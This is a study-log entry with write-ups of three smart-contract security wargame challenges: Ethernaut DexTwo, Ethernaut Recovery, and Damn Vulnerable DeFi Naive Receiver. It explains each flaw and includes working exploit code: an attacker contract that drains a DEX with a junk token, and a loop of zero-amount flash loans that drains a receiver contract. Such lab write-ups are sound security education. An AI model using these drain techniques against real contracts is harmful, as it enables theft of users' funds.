## Day 21

### Ethernaut #23 Dex2

This is a similar to an exercise we did using Echidna, also an Ethernaut challenge called Dex.  The main contract DexTwo is a DEX or decentralized exhcnage.  The problem with the first challenge was in the ```getSwapAmount()``` method, so let's compare those from the two challenges.

```Java
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }
```

Let's take a look at this function in the previous challenge: 

```Java
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }
```

The first challenge has an extra require statement: 

```Java
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

Without this staement we should be able to trade any tokens we want.  We will create a bogus coin, mint all the supply to ourselves and use this to drain the DEX.  Code to accomplish this is below.  

```Java
  contract Attacker{
      DexTwo immutable public dex;
      SwappableTokenTwo immutable junkcoin;
      address public token1;
      address public token2;

      constructor(address _dexAdd){
        dex = DexTwo(_dexAdd);
        junkcoin = new SwappableTokenTwo(_dexAdd, "junkcoin", "Junk", 1_000_000);
      }

      function attack() external {
        token1 = dex.token1();
        token2 = dex.token2();

        // add liquidity, so that DEx junkcoin balance is nonzero, we can't use dex.addLiqudity()
        junkcoin.transfer(address(dex), 100);

        // empty first coin
        junkcoin.approve(address(this), address(dex), 100);
        dex.swap(address(junkcoin), address(token1), 100);

        // now Dex has 200 junkcoins and 100 token2, so the swap ratio will be 1/2
        junkcoin.approve(address(this), address(dex), 200);
        dex.swap(address(junkcoin), address(token2), 200);
      }
  }
```

A few details should be metnioned.  We first create a new ERC20 token and mint some supply.  The minimum we need is 400 tokens. After the tokens are minted we need to transfer 100 tokens to the DEX. If we don't then we will get a divide by 0 error during ```getSwapAmount()```.   The DEX ```.addliquitidy()``` method cannot be used becuase it has the ```onlyOwner()``` modifier.  We will use the token's ```.tranfer()``` instead.  After this we can do a one for one swap for token1, then the DEX will have a balance of 200 junkcoins and we will need to send 200 junkcoins for 100 token2.  

### Ethernaut #17 (Recovery)

In this challenge the contract owner has created a token factory.  The tokens will take Ether as collateral and return tokens based on the colaterial sent.  There is no bonding curve.  The onwer sent 0.001 Ether to the contract.  The owner has forgotten the address of this contract and would like to get his Ether back.  Our objective is to retreive the 0.001 Ether.  Relevant parts of the contract are below.  

```Java
  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
```

The exploit lies in the ```destroy()``` method.  This is public, so anyone can call it, probably a bad idea. ```destroy()``` calls  ```selfdestruct()```.  ```selfdestruct()``` will destroy the contract and send the remaining balance to an address, all we have to do is specify our own address in a call to ```destroy()```.  


### Damn Vulnerable DeFi #2 Naive Receiver

This challenge is again on Flash Loan pools.  There is a pool (NaiveReceiverLenderPool) with 1000 ETH to loan out and for each borrow a fee of 1ETH is paid.  A user has deployed a contract (FlashLoanReceiver) to interact with the pool.  Our objective is to drain the user's contract (in one transaction if possible).  

Let's take a look at how Flash Loans are taken out in NaiveReceiverLenderPool.sol:  

```Java
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        if (token != ETH)
            revert UnsupportedCurrency();
        
        uint256 balanceBefore = address(this).balance;

        // Transfer ETH and handle control to receiver
        SafeTransferLib.safeTransferETH(address(receiver), amount);
        if(receiver.onFlashLoan(
            msg.sender,
            ETH,
            amount,
            FIXED_FEE,
            data
        ) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (address(this).balance < balanceBefore + FIXED_FEE)
            revert RepayFailed();

        return true;
    }
```

A user calls flashLoan() with the receiver, a token and, some data, and the amount to be borrowed.  As with most Flash Loans there is a check to make sure the loan was paid back at the end.  Now let's take a look at the receiver.  

```Java
    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        assembly { // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }
        
        if (token != ETH)
            revert UnsupportedCurrency();
        
        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Internal function where the funds received would be used
    function _executeActionDuringFlashLoan() internal { }
```

The only thing that looks suspicious to me is the unchecked ```amountToBeRepaid``` calculation, since there are no checks on these values there is some potential for over/underflow.  ```SafeTransferLib.safeTransferETH()``` is used in both the pool and the receiver, this will revert if too large of an amount is requested.  There is no check that the amount borrowed is greater than zero, so we could borrow 0 Ether 10 times and have drain the contract.  Another item of note is that the receiver pays back the amount from the function call, not checking if that was actually the amount received.  

Code doing this is shown below.  
```Javascript
        await pool.connect(player); 

        for (let i=0; i<10; i++) {
            await pool.flashLoan(receiver.address, pool.ETH(), 0, "0x");
        }
```